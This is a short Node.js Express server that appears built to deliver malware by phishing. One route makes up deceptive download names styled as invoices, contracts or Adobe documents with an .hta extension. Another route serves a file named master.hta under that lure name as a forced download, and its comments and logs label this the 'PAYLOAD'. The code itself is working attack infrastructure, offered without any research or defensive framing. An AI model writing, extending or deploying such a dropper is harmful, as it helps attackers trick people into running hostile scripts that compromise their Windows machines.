const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

// ✅ 1. BRIDGE - Generates unique .hta filename
app.get('/bridge', (req, res) => {
    const randomId = crypto.randomInt(100000, 999999);
    const themes = ['Adobe_Document', 'Contract_Agreement', 'Invoice_Scan', 'Policy_Update', 'Secure_Form'];
    const theme = themes[Math.floor(Math.random() * themes.length)];
    const uniqueName = `${theme}_${randomId}.hta`;
    
    console.log(`[BRIDGE] Generated: ${uniqueName}`);
    res.redirect(`/confirm.html?file=${encodeURIComponent(uniqueName)}`);
});

// ✅ 2. PAYLOAD - Serves master.hta as DIRECT .hta DOWNLOAD
app.get('/payload/:filename', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'master.hta');
    
    console.log(`[PAYLOAD] Requested: ${req.params.filename}`);
    console.log(`[PAYLOAD] Serving from: ${filePath}`);
    console.log(`[PAYLOAD] Exists: ${fs.existsSync(filePath)}`);
    
    if (!fs.existsSync(filePath)) {
        console.error('[PAYLOAD] master.hta NOT FOUND');
        return res.status(404).send('Source file missing.');
    }

    // Serve with EXACT requested filename as .hta
    res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
    res.setHeader('Content-Type', 'application/hta');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error(`[PAYLOAD] Send error: ${err.message}`);
            if (!res.headersSent) res.status(500).send('Failed');
        } else {
            console.log(`[PAYLOAD] Sent: ${req.params.filename}`);
        }
    });
});

// ✅ 3. SERVE ONLY SPECIFIC HTML FILES (NO blanket static middleware)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/confirm.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'confirm.html'));
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.listen(port, () => {
    console.log(`✅ Server running on port ${port}`);
});
